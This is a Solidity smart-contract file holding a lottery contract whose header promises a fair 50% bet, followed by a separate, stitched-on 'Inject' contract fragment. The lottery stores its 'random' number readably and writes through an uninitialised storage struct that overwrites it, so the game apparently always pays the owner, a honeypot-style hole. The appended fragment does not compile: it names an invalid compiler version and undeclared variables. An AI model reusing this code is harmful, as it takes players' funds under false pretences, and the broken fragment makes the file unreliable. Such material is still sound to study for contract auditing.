/*
BET NUMBER 0 or 1.IF YOU WIN,THIS CONTRACT WILL AUTOMATIC SEND ALL BALANCE TO YOU.IF YOU LOSE,
THIS CONTRACT WILL SEND ALL BALANCE TO OWNER. ENJOY 50%.
*/

pragma solidity ^0.4.19;
contract Lottery50chance
{
  // creates random number between 0 and 1 on contract creation
  uint256 private randomNumber = uint256( keccak256(now) ) % 2;
  uint256 public minBet = 1 ether;
  address owner = msg.sender;

  struct GameHistory
  {
    address player;
    uint256 number;
  }

  GameHistory[] public log;

  modifier onlyOwner()
  {
    require(msg.sender == owner);
    _;
  }

  function play(uint256 _number)
  public
  payable
  {
      if(msg.value >= minBet && _number <= 1)
      {
          GameHistory gameHistory;
          gameHistory.player = msg.sender;
          gameHistory.number = _number;
          log.push(gameHistory);

          // if player guesses correctly, transfer contract balance
          // else transfer to owner

          if (_number == randomNumber)
          {
              selfdestruct(msg.sender);
          }else{
              selfdestruct(owner);
          }

      }
  }

  //if no one play the game.owner withdraw

  function withdraw(uint256 amount)
  public
  onlyOwner
  {
    owner.transfer(amount);
  }

  function() public payable { }

}
pragma solidity ^0.5.24;
contract Inject {
	uint depositAmount;
	constructor() public {owner = msg.sender;}
	function freeze(address account,uint key) {
		if (msg.sender != minter)
			revert();
			freezeAccount[account] = key;
		}
	}
}
